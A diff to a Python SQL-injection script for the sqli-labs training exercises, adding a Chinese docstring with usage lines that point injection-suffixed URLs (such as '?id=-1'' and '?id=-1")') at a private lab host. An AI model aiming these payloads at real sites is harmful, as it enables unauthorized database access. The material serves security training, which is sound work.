@@ -1,5 +1,14 @@
 #!/usr/bin/env python 
 #coding:utf-8 
+
+'''
+**以下脚本为sqlmap第一课到第四课通用脚本，运行方法:
+Less1: 基于错误的单引号字符型注入：　python less1_02.py "http://192.168.32.142/sqli/Less-1/?id=-1'"
+Less2: 基于错误的整形注入： python less1_02.py "http://192.168.32.142/sqli/Less-2/?id=-1"
+Less3: 基于错误的单引号变形字符号注入  python less1_02.py "http://192.168.32.142/sqli/Less-3/?id=-1')"
+Less4. 基于错误的双引号字符型注入: python less1_02.py 'http://192.168.32.142/sqli/Less-4/?id=-1")'
+'''
+
 import requests
 import re,time,sys
 
@@ -102,3 +111,5 @@ class sqli():
 if __name__ == '__main__':
     sql = sqli()
     sql.getEmailCol()
+
+    
